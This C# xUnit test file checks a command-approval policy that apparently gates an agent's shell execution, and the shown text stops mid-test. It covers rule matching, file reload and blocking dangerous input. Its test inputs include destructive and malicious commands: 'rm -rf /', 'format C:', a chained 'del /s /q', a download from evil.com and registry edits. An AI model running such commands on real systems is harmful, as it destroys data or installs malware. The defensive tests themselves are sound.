using System;
using System.IO;
using System.Text.Json;
using System.Threading.Tasks;
using OpenClaw.Shared;
using OpenClaw.Shared.Capabilities;
using Xunit;

namespace OpenClaw.Shared.Tests;

public class ExecApprovalPolicyTests : IDisposable
{
    private readonly string _tempDir;
    private readonly ExecTestLogger _logger = new();
    
    public ExecApprovalPolicyTests()
    {
        _tempDir = Path.Combine(Path.GetTempPath(), $"openclaw-test-{Guid.NewGuid():N}");
        Directory.CreateDirectory(_tempDir);
    }
    
    public void Dispose()
    {
        // slopwatch-ignore: SW003 Test cleanup or fixture teardown is best-effort and must not hide the test outcome.
        try { Directory.Delete(_tempDir, true); } catch { }
    }
    
    private ExecApprovalPolicy CreatePolicy() => new(_tempDir, _logger);
    
    [Fact]
    public void DefaultPolicy_DeniesUnknownCommands()
    {
        var policy = CreatePolicy();
        var result = policy.Evaluate("format C:");
        Assert.False(result.Allowed);
    }
    
    [Fact]
    public void DefaultPolicy_AllowsEchoCommands()
    {
        var policy = CreatePolicy();
        var result = policy.Evaluate("echo hello world");
        Assert.True(result.Allowed);
        Assert.Equal("echo *", result.MatchedPattern);
    }
    
    [Fact]
    public void DefaultPolicy_AllowsGetCmdlets()
    {
        var policy = CreatePolicy();
        var result = policy.Evaluate("Get-Process", "powershell");
        Assert.True(result.Allowed);
    }
    
    [Fact]
    public void DefaultPolicy_DeniesRemoveItem()
    {
        var policy = CreatePolicy();
        var result = policy.Evaluate("Remove-Item C:\\important");
        Assert.False(result.Allowed);
    }
    
    [Fact]
    public void DefaultPolicy_DeniesRm()
    {
        var policy = CreatePolicy();
        var result = policy.Evaluate("rm -rf /");
        Assert.False(result.Allowed);
    }
    
    [Fact]
    public void DefaultPolicy_DeniesShutdown()
    {
        var policy = CreatePolicy();
        var result = policy.Evaluate("shutdown /s /t 0");
        Assert.False(result.Allowed);
    }
    
    [Fact]
    public void DefaultPolicy_AllowsHostname()
    {
        var policy = CreatePolicy();
        var result = policy.Evaluate("hostname");
        Assert.True(result.Allowed);
    }
    
    [Fact]
    public void DefaultPolicy_AllowsWhoami()
    {
        var policy = CreatePolicy();
        var result = policy.Evaluate("whoami");
        Assert.True(result.Allowed);
    }
    
    [Fact]
    public void CustomRules_FirstMatchWins()
    {
        var policy = CreatePolicy();
        policy.SetRules(new[]
        {
            new ExecApprovalRule { Pattern = "echo secret*", Action = ExecApprovalAction.Deny },
            new ExecApprovalRule { Pattern = "echo *", Action = ExecApprovalAction.Allow }
        });
        
        // "echo secret" should be denied (first rule matches)
        var result1 = policy.Evaluate("echo secret stuff");
        Assert.False(result1.Allowed);
        
        // "echo hello" should be allowed (second rule matches)
        var result2 = policy.Evaluate("echo hello");
        Assert.True(result2.Allowed);
    }
    
    [Fact]
    public void ShellFilter_RestrictsToSpecificShells()
    {
        var policy = CreatePolicy();
        policy.SetRules(new[]
        {
            new ExecApprovalRule { Pattern = "Get-*", Action = ExecApprovalAction.Allow, Shells = new[] { "pwsh" } }
        });
        
        // Allowed with pwsh
        var result1 = policy.Evaluate("Get-Process", "pwsh");
        Assert.True(result1.Allowed);
        
        // Denied with cmd (shell doesn't match, falls to default deny)
        var result2 = policy.Evaluate("Get-Process", "cmd");
        Assert.False(result2.Allowed);
    }
    
    [Fact]
    public void DisabledRule_IsSkipped()
    {
        var policy = CreatePolicy();
        policy.SetRules(new[]
        {
            new ExecApprovalRule { Pattern = "*", Action = ExecApprovalAction.Allow, Enabled = false },
            new ExecApprovalRule { Pattern = "*", Action = ExecApprovalAction.Deny }
        });
        
        var result = policy.Evaluate("anything");
        Assert.False(result.Allowed);
    }
    
    [Fact]
    public void DefaultAction_Allow_PermitsUnmatched()
    {
        var policy = CreatePolicy();
        policy.SetRules(Array.Empty<ExecApprovalRule>(), ExecApprovalAction.Allow);
        
        var result = policy.Evaluate("anything goes");
        Assert.True(result.Allowed);
    }
    
    [Fact]
    public void EmptyCommand_IsDenied()
    {
        var policy = CreatePolicy();
        var result = policy.Evaluate("");
        Assert.False(result.Allowed);
        Assert.Equal("Empty command", result.Reason);
    }
    
    [Fact]
    public void NullCommand_IsDenied()
    {
        var policy = CreatePolicy();
        var result = policy.Evaluate(null!);
        Assert.False(result.Allowed);
    }
    
    [Fact]
    public void AddRule_PersistsToDisk()
    {
        var policy = CreatePolicy();
        policy.SetRules(Array.Empty<ExecApprovalRule>());
        policy.AddRule(new ExecApprovalRule { Pattern = "test *", Action = ExecApprovalAction.Allow });
        
        // Reload from disk
        var policy2 = CreatePolicy();
        Assert.Single(policy2.Rules);
        Assert.Equal("test *", policy2.Rules[0].Pattern);
    }
    
    [Fact]
    public void RemoveRule_PersistsToDisk()
    {
        var policy = CreatePolicy();
        policy.SetRules(new[]
        {
            new ExecApprovalRule { Pattern = "a", Action = ExecApprovalAction.Allow },
            new ExecApprovalRule { Pattern = "b", Action = ExecApprovalAction.Deny }
        });
        
        policy.RemoveRule(0);
        
        var policy2 = CreatePolicy();
        Assert.Single(policy2.Rules);
        Assert.Equal("b", policy2.Rules[0].Pattern);
    }
    
    [Fact]
    public void InsertRule_InsertsAtCorrectPosition()
    {
        var policy = CreatePolicy();
        policy.SetRules(new[]
        {
            new ExecApprovalRule { Pattern = "first" },
            new ExecApprovalRule { Pattern = "third" }
        });
        
        policy.InsertRule(1, new ExecApprovalRule { Pattern = "second" });
        
        Assert.Equal(3, policy.Rules.Count);
        Assert.Equal("second", policy.Rules[1].Pattern);
    }
    
    [Fact]
    public void GetPolicyData_ReturnsCurrentState()
    {
        var policy = CreatePolicy();
        policy.SetRules(new[]
        {
            new ExecApprovalRule { Pattern = "test", Action = ExecApprovalAction.Allow, Description = "Test rule" }
        }, ExecApprovalAction.Allow);
        
        var data = policy.GetPolicyData();
        Assert.Equal(ExecApprovalAction.Allow, data.DefaultAction);
        Assert.Single(data.Rules);
        Assert.Equal("test", data.Rules[0].Pattern);
    }
    
    [Fact]
    public void PatternMatching_Wildcard_MatchesAny()
    {
        var policy = CreatePolicy();
        Assert.True(policy.MatchesPattern("anything", "*"));
    }
    
    [Fact]
    public void PatternMatching_GlobStar_MatchesSuffix()
    {
        var policy = CreatePolicy();
        Assert.True(policy.MatchesPattern("Get-Process -Name foo", "Get-*"));
        Assert.False(policy.MatchesPattern("Set-Location", "Get-*"));
    }
    
    [Fact]
    public void PatternMatching_CaseInsensitive()
    {
        var policy = CreatePolicy();
        Assert.True(policy.MatchesPattern("ECHO hello", "echo *"));
        Assert.True(policy.MatchesPattern("echo HELLO", "ECHO *"));
    }
    
    [Fact]
    public void PatternMatching_QuestionMark_MatchesSingleChar()
    {
        var policy = CreatePolicy();
        Assert.True(policy.MatchesPattern("dir a", "dir ?"));
        Assert.False(policy.MatchesPattern("dir ab", "dir ?"));
    }
    
    [Fact]
    public void PatternMatching_ContainsWildcard()
    {
        var policy = CreatePolicy();
        // Pattern like "*dangerous*" matches anywhere in command
        Assert.True(policy.MatchesPattern("something dangerous here", "*dangerous*"));
        Assert.False(policy.MatchesPattern("something safe here", "*dangerous*"));
    }
    
    [Fact]
    public void CorruptPolicyFile_FallsBackToDefaults()
    {
        File.WriteAllText(Path.Combine(_tempDir, "exec-policy.json"), "NOT JSON{{{");
        
        var policy = CreatePolicy();
        // Should still work with defaults
        var result = policy.Evaluate("echo hello");
        Assert.True(result.Allowed);
    }
    
    [Fact]
    public void InsertRule_ClampsToZero_ForNegativeIndex()
    {
        var policy = CreatePolicy();
        policy.SetRules(new[]
        {
            new ExecApprovalRule { Pattern = "first" },
            new ExecApprovalRule { Pattern = "second" }
        });
        
        policy.InsertRule(-5, new ExecApprovalRule { Pattern = "inserted" });
        
        Assert.Equal(3, policy.Rules.Count);
        Assert.Equal("inserted", policy.Rules[0].Pattern); // Inserted at index 0
    }
    
    [Fact]
    public void InsertRule_ClampsToEnd_ForIndexBeyondCount()
    {
        var policy = CreatePolicy();
        policy.SetRules(new[]
        {
            new ExecApprovalRule { Pattern = "first" }
        });
        
        policy.InsertRule(100, new ExecApprovalRule { Pattern = "last" });
        
        Assert.Equal(2, policy.Rules.Count);
        Assert.Equal("last", policy.Rules[^1].Pattern); // Inserted at end
    }
    
    [Fact]
    public void RemoveRule_ReturnsFalse_ForNegativeIndex()
    {
        var policy = CreatePolicy();
        policy.SetRules(new[]
        {
            new ExecApprovalRule { Pattern = "rule1" }
        });
        
        var removed = policy.RemoveRule(-1);
        Assert.False(removed);
        Assert.Single(policy.Rules);
    }
    
    [Fact]
    public void RemoveRule_ReturnsFalse_ForIndexAtCount()
    {
        var policy = CreatePolicy();
        policy.SetRules(new[]
        {
            new ExecApprovalRule { Pattern = "rule1" }
        });
        
        var removed = policy.RemoveRule(1); // index == count, out of range
        Assert.False(removed);
        Assert.Single(policy.Rules);
    }
    
    [Fact]
    public void DefaultPolicy_CreatesFile_OnFirstLoad()
    {
        var policyFile = Path.Combine(_tempDir, "exec-policy.json");
        Assert.False(File.Exists(policyFile)); // Does not exist yet
        
        var policy = CreatePolicy(); // Load() auto-creates defaults
        
        Assert.True(File.Exists(policyFile)); // Should now exist
        Assert.True(policy.Rules.Count > 0);
    }
    
    [Fact]
    public void WhitespaceOnlyCommand_IsDenied()
    {
        var policy = CreatePolicy();
        var result = policy.Evaluate("   ");
        Assert.False(result.Allowed);
        Assert.Equal("Empty command", result.Reason);
    }
    
    [Fact]
    public void DefaultPolicy_DeniesWebDownloads()
    {
        var policy = CreatePolicy();
        var result = policy.Evaluate("Invoke-WebRequest https://evil.com/malware.exe");
        Assert.False(result.Allowed);
    }
    
    [Fact]
    public void DefaultPolicy_DeniesRegistryEdits()
    {
        var policy = CreatePolicy();
        var result = policy.Evaluate("reg add HKLM\\Software\\Evil");
        Assert.False(result.Allowed);
    }
    
    [Fact]
    public void ShellFilter_DefaultsToLowercase_WhenShellNotProvided()
    {
        var policy = CreatePolicy();
        policy.SetRules(new[]
        {
            // Rule only applies to "cmd"
            new ExecApprovalRule { Pattern = "dir *", Action = ExecApprovalAction.Allow, Shells = new[] { "cmd" } }
        });
        
        // When no shell is provided, defaults to "powershell" internally, so cmd-only rule doesn't match
        var result = policy.Evaluate("dir C:\\", null); // null shell -> defaults to "powershell"
        Assert.False(result.Allowed); // cmd rule didn't match, default deny applies
    }

    // ── Legacy "ask" alias migration (regression for silent rule wipe) ──
    // Older Permissions UI versions wrote "ask" instead of the canonical "prompt".
    // Before the fix, Load() would throw on "ask", fall back to default rules, and
    // overwrite the user's file — silently destroying any custom rules they had.

    [Fact]
    public void Load_AcceptsLegacyAskAlias_WithoutDataLoss()
    {
        var legacy = """
        {
          "defaultAction": "ask",
          "rules": [
            { "pattern": "my-custom *", "action": "ask" },
            { "pattern": "secret-only", "action": "allow" }
          ]
        }
        """;
        File.WriteAllText(Path.Combine(_tempDir, "exec-policy.json"), legacy);

        var policy = CreatePolicy();

        Assert.Equal(ExecApprovalAction.Prompt, policy.DefaultAction);
        Assert.Equal(2, policy.Rules.Count);
        Assert.Equal("my-custom *", policy.Rules[0].Pattern);
        Assert.Equal(ExecApprovalAction.Prompt, policy.Rules[0].Action);
        Assert.Equal(ExecApprovalAction.Allow, policy.Rules[1].Action);
    }

    [Fact]
    public void Load_LegacyAskFile_DoesNotOverwriteWithDefaultRules()
    {
        var legacy = """
        {
          "defaultAction": "ask",
          "rules": [
            { "pattern": "my-unique-pattern-xyz *", "action": "allow" }
          ]
        }
        """;
        var path = Path.Combine(_tempDir, "exec-policy.json");
        File.WriteAllText(path, legacy);

        _ = CreatePolicy(); // triggers Load()

        // File contents must still contain the user's custom rule. If the bug regresses,
        // Load()'s catch handler would overwrite the file with CreateDefaultRules().
        var after = File.ReadAllText(path);
        Assert.Contains("my-unique-pattern-xyz", after);
    }

    [Fact]
    public void Save_AfterLoadingLegacyAsk_EmitsCanonicalPrompt()
    {
        var legacy = """{"defaultAction":"ask","rules":[]}""";
        var path = Path.Combine(_tempDir, "exec-policy.json");
        File.WriteAllText(path, legacy);

        var policy = CreatePolicy();
        policy.Save();

        var after = File.ReadAllText(path);
        Assert.Contains("\"prompt\"", after);
        Assert.DoesNotContain("\"ask\"", after);
    }

    [Fact]
    public void Load_AcceptsCanonicalPromptValue()
    {
        var canonical = """{"defaultAction":"prompt","rules":[{"pattern":"x","action":"prompt"}]}""";
        File.WriteAllText(Path.Combine(_tempDir, "exec-policy.json"), canonical);

        var policy = CreatePolicy();

        Assert.Equal(ExecApprovalAction.Prompt, policy.DefaultAction);
        Assert.Single(policy.Rules);
        Assert.Equal(ExecApprovalAction.Prompt, policy.Rules[0].Action);
    }

    // ── Hot-reload regression tests ──
    // The Permissions UI writes exec-policy.json directly. The engine holds an
    // ExecApprovalPolicy in memory, so without hot-reload the user's edits had
    // no effect on the running engine until restart. Evaluate() now stats the
    // file and reloads on (mtime, length) change — without overwriting in-memory
    // state if the on-disk content is torn/corrupt.

    private static void WritePolicyFile(string path, string json, DateTime mtimeUtc)
    {
        // Atomic write — production callers (ExecApprovalPolicy.Save and the
        // permissions UI) both use tmp+rename so the Evaluate hot-reload never
        // observes a partially-written file. Retries on AccessDenied because
        // the concurrency test runs Evaluate in parallel and File.ReadAllText
        // briefly holds a share-deny that can race File.Move on Windows.
        var tmp = $"{path}.{Guid.NewGuid():N}.tmp";
        File.WriteAllText(tmp, json);
        File.SetLastWriteTimeUtc(tmp, mtimeUtc);
        for (var attempt = 0; ; attempt++)
        {
            try
            {
                File.Move(tmp, path, overwrite: true);
                return;
            }
            catch (UnauthorizedAccessException) when (attempt < 20)
            {
                System.Threading.Thread.Sleep(5);
            }
            catch (IOException) when (attempt < 20)
            {
                System.Threading.Thread.Sleep(5);
            }
        }
    }

    [Fact]
    public void Evaluate_HotReloads_WhenExternalProcessChangesDefaultAction()
    {
        var path = Path.Combine(_tempDir, "exec-policy.json");
        WritePolicyFile(path, """{"defaultAction":"allow","rules":[]}""", DateTime.UtcNow.AddSeconds(-5));

        var policy = CreatePolicy();
        Assert.True(policy.Evaluate("anything goes").Allowed);

        // External writer changes default to deny. Bump mtime so the signature
        // changes even if the back-to-back write lands on the same second.
        WritePolicyFile(path, """{"defaultAction":"deny","rules":[]}""", DateTime.UtcNow.AddSeconds(5));

        var result = policy.Evaluate("anything goes");
        Assert.False(result.Allowed);
        Assert.Equal(ExecApprovalAction.Deny, result.Action);
    }

    [Fact]
    public void Evaluate_PreservesInMemoryState_OnTornOrCorruptFile()
    {
        var path = Path.Combine(_tempDir, "exec-policy.json");
        WritePolicyFile(path, """{"defaultAction":"deny","rules":[{"pattern":"keep-me *","action":"allow"}]}""",
                        DateTime.UtcNow.AddSeconds(-5));

        var policy = CreatePolicy();
        Assert.True(policy.Evaluate("keep-me please").Allowed);

        var diskBefore = File.ReadAllText(path);

        // Simulate a torn write: a truncated/invalid JSON document with a
        // newer mtime. The engine must NOT clobber its in-memory state.
        WritePolicyFile(path, "{ \"defaultAct", DateTime.UtcNow.AddSeconds(5));

        var result = policy.Evaluate("keep-me please");
        Assert.True(result.Allowed); // in-memory rule still active

        // The engine must not have rewritten the file in response to bad JSON.
        Assert.Equal("{ \"defaultAct", File.ReadAllText(path));
        _ = diskBefore; // baseline for readers
    }

    [Fact]
    public void Evaluate_PicksUpValidWriteAfterCorruptFile()
    {
        var path = Path.Combine(_tempDir, "exec-policy.json");
        WritePolicyFile(path, """{"defaultAction":"allow","rules":[]}""", DateTime.UtcNow.AddSeconds(-10));

        var policy = CreatePolicy();
        Assert.True(policy.Evaluate("foo").Allowed);

        // Step 1: torn write. Should be a no-op for in-memory state.
        WritePolicyFile(path, "{ broken", DateTime.UtcNow.AddSeconds(-5));
        Assert.True(policy.Evaluate("foo").Allowed);

        // Step 2: external writer finishes with a valid file. Engine must
        // notice (signature was not bumped on the bad read) and reload.
        WritePolicyFile(path, """{"defaultAction":"deny","rules":[]}""", DateTime.UtcNow.AddSeconds(5));

        Assert.False(policy.Evaluate("foo").Allowed);
    }

    [Fact]
    public void Evaluate_DoesNotThrow_OnConcurrentInvocations()
    {
        var path = Path.Combine(_tempDir, "exec-policy.json");
        WritePolicyFile(path, """{"defaultAction":"deny","rules":[{"pattern":"echo *","action":"allow"}]}""",
                        DateTime.UtcNow);

        var policy = CreatePolicy();

        // Mix of evaluators and one writer racing the hot-reload code path.
        // Just verifying no exception escapes the lock-protected snapshot.
        var ex = Record.Exception(() =>
            Parallel.For(0, 200, i =>
            {
                if (i % 50 == 0)
                {
                    WritePolicyFile(path,
                        $$"""{"defaultAction":"deny","rules":[{"pattern":"echo {{i}}","action":"allow"}]}""",
                        DateTime.UtcNow.AddMilliseconds(i));
                }
                _ = policy.Evaluate("echo hello");
            }));

        Assert.Null(ex);
    }
}

public class SystemCapabilityExecApprovalsTests
{
    private readonly ExecTestLogger _logger = new();
    
    private SystemCapability CreateCapability(ExecApprovalPolicy? policy = null)
    {
        var cap = new SystemCapability(_logger);
        cap.SetCommandRunner(new MockCommandRunner());
        if (policy != null) cap.SetApprovalPolicy(policy);
        return cap;
    }
    
    [Fact]
    public async Task SystemRun_WithPolicy_DeniesBlockedCommands()
    {
        var tempDir = Path.Combine(Path.GetTempPath(), $"test-{Guid.NewGuid():N}");
        Directory.CreateDirectory(tempDir);
        try
        {
            var policy = new ExecApprovalPolicy(tempDir, _logger);
            policy.SetRules(new[]
            {
                new ExecApprovalRule { Pattern = "echo *", Action = ExecApprovalAction.Allow },
            }, ExecApprovalAction.Deny);
            
            var cap = CreateCapability(policy);
            
            // This should be denied - rm doesn't match echo *
            var request = new NodeInvokeRequest
            {
                Command = "system.run",
                Args = JsonDocument.Parse("{\"command\":\"rm -rf /\"}").RootElement
            };
            
            var result = await cap.ExecuteAsync(request);
            Assert.False(result.Ok);
            Assert.Contains("denied", result.Error!, StringComparison.OrdinalIgnoreCase);
        }
        finally
        {
            // slopwatch-ignore: SW003 Test cleanup or fixture teardown is best-effort and must not hide the test outcome.
            try { Directory.Delete(tempDir, true); } catch { }
        }
    }
    
    [Fact]
    public async Task SystemRun_WithPolicy_AllowsApprovedCommands()
    {
        var tempDir = Path.Combine(Path.GetTempPath(), $"test-{Guid.NewGuid():N}");
        Directory.CreateDirectory(tempDir);
        try
        {
            var policy = new ExecApprovalPolicy(tempDir, _logger);
            policy.SetRules(new[]
            {
                new ExecApprovalRule { Pattern = "echo *", Action = ExecApprovalAction.Allow },
            }, ExecApprovalAction.Deny);
            
            var cap = CreateCapability(policy);
            
            var request = new NodeInvokeRequest
            {
                Command = "system.run",
                Args = JsonDocument.Parse("{\"command\":\"echo hello\"}").RootElement
            };
            
            var result = await cap.ExecuteAsync(request);
            Assert.True(result.Ok);
        }
        finally
        {
            // slopwatch-ignore: SW003 Test cleanup or fixture teardown is best-effort and must not hide the test outcome.
            try { Directory.Delete(tempDir, true); } catch { }
        }
    }
    
    [Fact]
    public async Task SystemRun_ArrayCommand_WithPolicy_DeniesBlockedCommands()
    {
        // Regression test: when command is an argv array like ["rm", "-rf", "/"],
        // policy must evaluate the full "rm -rf /" string, not just "rm".
        var tempDir = Path.Combine(Path.GetTempPath(), $"test-{Guid.NewGuid():N}");
        Directory.CreateDirectory(tempDir);
        try
        {
            var policy = new ExecApprovalPolicy(tempDir, _logger);
            policy.SetRules(new[]
            {
                new ExecApprovalRule { Pattern = "echo *", Action = ExecApprovalAction.Allow },
            }, ExecApprovalAction.Deny);
            
            var cap = CreateCapability(policy);
            
            // Array-style command: ["rm", "-rf", "/"] — must be denied
            var request = new NodeInvokeRequest
            {
                Command = "system.run",
                Args = JsonDocument.Parse("{\"command\":[\"rm\",\"-rf\",\"/\"]}").RootElement
            };
            
            var result = await cap.ExecuteAsync(request);
            Assert.False(result.Ok);
            Assert.Contains("denied", result.Error!, StringComparison.OrdinalIgnoreCase);
        }
        finally
        {
            // slopwatch-ignore: SW003 Test cleanup or fixture teardown is best-effort and must not hide the test outcome.
            try { Directory.Delete(tempDir, true); } catch { }
        }
    }
    
    [Fact]
    public async Task SystemRun_ArrayCommand_WithPolicy_AllowsApprovedCommands()
    {
        // Array-style command ["echo", "hello"] should match "echo *" and be allowed
        var tempDir = Path.Combine(Path.GetTempPath(), $"test-{Guid.NewGuid():N}");
        Directory.CreateDirectory(tempDir);
        try
        {
            var policy = new ExecApprovalPolicy(tempDir, _logger);
            policy.SetRules(new[]
            {
                new ExecApprovalRule { Pattern = "echo *", Action = ExecApprovalAction.Allow },
            }, ExecApprovalAction.Deny);
            
            var cap = CreateCapability(policy);
            
            var request = new NodeInvokeRequest
            {
                Command = "system.run",
                Args = JsonDocument.Parse("{\"command\":[\"echo\",\"hello\"]}").RootElement
            };
            
            var result = await cap.ExecuteAsync(request);
            Assert.True(result.Ok);
        }
        finally
        {
            // slopwatch-ignore: SW003 Test cleanup or fixture teardown is best-effort and must not hide the test outcome.
            try { Directory.Delete(tempDir, true); } catch { }
        }
    }
    
    [Fact]
    public async Task SystemRun_ArrayCommand_PolicyEvaluatesFullCommandLine()
    {
        // A rule blocking "rm -rf *" should catch ["rm", "-rf", "/"] but allow ["rm", "safe.txt"]
        var tempDir = Path.Combine(Path.GetTempPath(), $"test-{Guid.NewGuid():N}");
        Directory.CreateDirectory(tempDir);
        try
        {
            var policy = new ExecApprovalPolicy(tempDir, _logger);
            policy.SetRules(new[]
            {
                new ExecApprovalRule { Pattern = "rm -rf *", Action = ExecApprovalAction.Deny },
                new ExecApprovalRule { Pattern = "rm *", Action = ExecApprovalAction.Allow },
            }, ExecApprovalAction.Deny);
            
            var cap = CreateCapability(policy);
            
            // ["rm", "-rf", "/"] should be denied by "rm -rf *"
            var dangerousRequest = new NodeInvokeRequest
            {
                Command = "system.run",
                Args = JsonDocument.Parse("{\"command\":[\"rm\",\"-rf\",\"/\"]}").RootElement
            };
            var result1 = await cap.ExecuteAsync(dangerousRequest);
            Assert.False(result1.Ok);
            Assert.Contains("denied", result1.Error!, StringComparison.OrdinalIgnoreCase);
            
            // ["rm", "safe.txt"] should be allowed by "rm *"
            var safeRequest = new NodeInvokeRequest
            {
                Command = "system.run",
                Args = JsonDocument.Parse("{\"command\":[\"rm\",\"safe.txt\"]}").RootElement
            };
            var result2 = await cap.ExecuteAsync(safeRequest);
            Assert.True(result2.Ok);
        }
        finally
        {
            // slopwatch-ignore: SW003 Test cleanup or fixture teardown is best-effort and must not hide the test outcome.
            try { Directory.Delete(tempDir, true); } catch { }
        }
    }
    
    [Fact]
    public async Task SystemRun_WithoutPolicy_AllowsAll()
    {
        var cap = CreateCapability(null);
        
        var request = new NodeInvokeRequest
        {
            Command = "system.run",
            Args = JsonDocument.Parse("{\"command\":\"anything\"}").RootElement
        };
        
        var result = await cap.ExecuteAsync(request);
        Assert.True(result.Ok);
    }

    [Fact]
    public async Task SystemRun_WithDefaultAllow_DeniesDangerousPowerShellWrapperPayload()
    {
        var tempDir = Path.Combine(Path.GetTempPath(), $"test-{Guid.NewGuid():N}");
        Directory.CreateDirectory(tempDir);
        try
        {
            var policy = new ExecApprovalPolicy(tempDir, _logger);
            policy.SetRules(
                new[]
                {
                    new ExecApprovalRule { Pattern = "Remove-Item *", Action = ExecApprovalAction.Deny }
                },
                ExecApprovalAction.Allow);

            var cap = CreateCapability(policy);
            var request = new NodeInvokeRequest
            {
                Command = "system.run",
                Args = JsonDocument.Parse("{\"command\":[\"powershell\",\"-Command\",\"Remove-Item -Recurse -Force C:\\\\important\"]}").RootElement
            };

            var result = await cap.ExecuteAsync(request);
            Assert.False(result.Ok);
            Assert.Contains("denied", result.Error!, StringComparison.OrdinalIgnoreCase);
        }
        finally
        {
            // slopwatch-ignore: SW003 Test cleanup or fixture teardown is best-effort and must not hide the test outcome.
            try { Directory.Delete(tempDir, true); } catch { }
        }
    }

    [Fact]
    public async Task SystemRun_WithCommandChain_DeniesBlockedSegment()
    {
        var tempDir = Path.Combine(Path.GetTempPath(), $"test-{Guid.NewGuid():N}");
        Directory.CreateDirectory(tempDir);
        try
        {
            var policy = new ExecApprovalPolicy(tempDir, _logger);
            policy.SetRules(
                new[]
                {
                    new ExecApprovalRule { Pattern = "echo *", Action = ExecApprovalAction.Allow },
                    new ExecApprovalRule { Pattern = "del *", Action = ExecApprovalAction.Deny }
                },
                ExecApprovalAction.Deny);

            var cap = CreateCapability(policy);
            var request = new NodeInvokeRequest
            {
                Command = "system.run",
                Args = JsonDocument.Parse("{\"command\":\"echo ok & del /s /q C:\\\\important\\\\*\",\"shell\":\"cmd\"}").RootElement
            };

            var result = await cap.ExecuteAsync(request);
            Assert.False(result.Ok);
            Assert.Contains("denied", result.Error!, StringComparison.OrdinalIgnoreCase);
        }
        finally
        {
            // slopwatch-ignore: SW003 Test cleanup or fixture teardown is best-effort and must not hide the test outcome.
            try { Directory.Delete(tempDir, true); } catch { }
        }
    }

    /// <summary>
    /// Verifies that exec-approvals.set rejects Allow rules where a dangerous command stem
    /// is immediately followed by a wildcard (e.g. "rm*"), which would bypass the trailing-
    /// space fragment check used for patterns like "rm ".
    /// </summary>
    [Theory]
    [InlineData("rm*")]
    [InlineData("rm?")]
    [InlineData("del*")]
    [InlineData("del?")]
    [InlineData("remove-item*")]
    [InlineData("shutdown*")]
    [InlineData("net*")]
    public async Task ExecApprovalsSet_RejectsDangerousStemPlusWildcardAllowRule(string dangerousPattern)
    {
        var tempDir = Path.Combine(Path.GetTempPath(), $"test-{Guid.NewGuid():N}");
        Directory.CreateDirectory(tempDir);
        try
        {
            var policy = new ExecApprovalPolicy(tempDir, _logger);
            var cap = CreateCapability(policy);

            var json = JsonDocument.Parse($@"{{
                ""baseHash"": ""{policy.GetPolicyHash()}"",
                ""rules"": [
                    {{""pattern"": ""{dangerousPattern}"", ""action"": ""allow""}}
                ],
                ""defaultAction"": ""deny""
            }}");

            var request = new NodeInvokeRequest
            {
                Command = "system.execApprovals.set",
                Args = json.RootElement
            };

            var result = await cap.ExecuteAsync(request);
            Assert.False(result.Ok);
            Assert.Contains("Dangerous allow rule is not permitted", result.Error!, StringComparison.OrdinalIgnoreCase);
        }
        finally
        {
            // slopwatch-ignore: SW003 Test cleanup or fixture teardown is best-effort and must not hide the test outcome.
            try { Directory.Delete(tempDir, true); } catch { }
        }
    }

    [Fact]
    public async Task ExecApprovalsGet_ReturnsPolicy()
    {
        var tempDir = Path.Combine(Path.GetTempPath(), $"test-{Guid.NewGuid():N}");
        Directory.CreateDirectory(tempDir);
        try
        {
            var policy = new ExecApprovalPolicy(tempDir, _logger);
            var cap = CreateCapability(policy);
            
            var request = new NodeInvokeRequest
            {
                Command = "system.execApprovals.get",
                Args = default
            };
            
            var result = await cap.ExecuteAsync(request);
            Assert.True(result.Ok);
            Assert.NotNull(result.Payload);
            
            // Verify payload contains expected policy structure
            var json = JsonSerializer.Serialize(result.Payload);
            using var doc = JsonDocument.Parse(json);
            var root = doc.RootElement;
            Assert.True(root.TryGetProperty("enabled", out var enabledEl));
            Assert.True(enabledEl.GetBoolean());
            Assert.True(root.TryGetProperty("defaultAction", out var defEl));
            Assert.Equal("deny", defEl.GetString());
            Assert.True(root.TryGetProperty("hash", out var hashEl));
            Assert.StartsWith("sha256:", hashEl.GetString());
            Assert.True(root.TryGetProperty("baseHash", out var baseHashEl));
            Assert.Equal(hashEl.GetString(), baseHashEl.GetString());
            Assert.True(root.TryGetProperty("rules", out var rulesEl));
            Assert.Equal(JsonValueKind.Array, rulesEl.ValueKind);
            Assert.True(rulesEl.GetArrayLength() > 0, "Default policy should have rules");
        }
        finally
        {
            // slopwatch-ignore: SW003 Test cleanup or fixture teardown is best-effort and must not hide the test outcome.
            try { Directory.Delete(tempDir, true); } catch { }
        }
    }
    
    [Fact]
    public async Task ExecApprovalsGet_WithoutPolicy_ReturnsDisabled()
    {
        var cap = CreateCapability(null);
        
        var request = new NodeInvokeRequest
        {
            Command = "system.execApprovals.get",
            Args = default
        };
        
        var result = await cap.ExecuteAsync(request);
        Assert.True(result.Ok);
        Assert.NotNull(result.Payload);
        
        // Verify payload explicitly indicates disabled state
        var json = JsonSerializer.Serialize(result.Payload);
        using var doc = JsonDocument.Parse(json);
        var root = doc.RootElement;
        Assert.True(root.TryGetProperty("enabled", out var enabledEl));
        Assert.False(enabledEl.GetBoolean());
    }
    
    [Fact]
    public async Task ExecApprovalsSet_UpdatesPolicy()
    {
        var tempDir = Path.Combine(Path.GetTempPath(), $"test-{Guid.NewGuid():N}");
        Directory.CreateDirectory(tempDir);
        try
        {
            var policy = new ExecApprovalPolicy(tempDir, _logger);
            var cap = CreateCapability(policy);
            
            var json = JsonDocument.Parse(@"{
                ""baseHash"": """ + policy.GetPolicyHash() + @""",
                ""rules"": [
                    {""pattern"": ""test *"", ""action"": ""allow"", ""description"": ""Test rule""}
                ],
                ""defaultAction"": ""deny""
            }");
            
            var request = new NodeInvokeRequest
            {
                Command = "system.execApprovals.set",
                Args = json.RootElement
            };
            
            var result = await cap.ExecuteAsync(request);
            Assert.True(result.Ok);
            
            // Verify policy was updated
            Assert.Single(policy.Rules);
            Assert.Equal("test *", policy.Rules[0].Pattern);
        }
        finally
        {
            // slopwatch-ignore: SW003 Test cleanup or fixture teardown is best-effort and must not hide the test outcome.
            try { Directory.Delete(tempDir, true); } catch { }
        }
    }

    [Fact]
    public async Task SystemRun_SeparateArgsProperty_PolicyEvaluatesFullCommandLine()
    {
        // Regression guard: when "command" is a string and args come from the separate
        // "args" JSON property (e.g. {"command":"rm","args":["-rf","/"]}), the policy
        // must evaluate the full combined command "rm -rf /" — not just "rm".
        var tempDir = Path.Combine(Path.GetTempPath(), $"test-{Guid.NewGuid():N}");
        Directory.CreateDirectory(tempDir);
        try
        {
            var policy = new ExecApprovalPolicy(tempDir, _logger);
            policy.SetRules(new[]
            {
                new ExecApprovalRule { Pattern = "rm -rf *", Action = ExecApprovalAction.Deny },
